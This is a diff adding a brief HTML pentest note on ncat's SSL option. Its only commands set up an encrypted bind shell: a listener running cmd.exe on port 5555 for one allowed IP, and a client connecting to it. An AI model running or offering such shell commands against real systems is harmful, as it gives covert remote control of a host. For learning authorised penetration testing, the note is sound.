@@ -1,0 +1,10 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Encryption with Ncat</title>
+</head><body>Ncat is a better and more modern version of netcat. One feature it has that netcat does not have is encryption. If you are on a pentestjob you might not want to communicate unencrypted.<br/>
+Bind<br/>
+<br/>
+ncat --exec cmd.exe --allow 192.168.1.101 -vnl 5555 --ssl<br/>
+ncat -v 192.168.1.103 5555 --ssl</body></html>
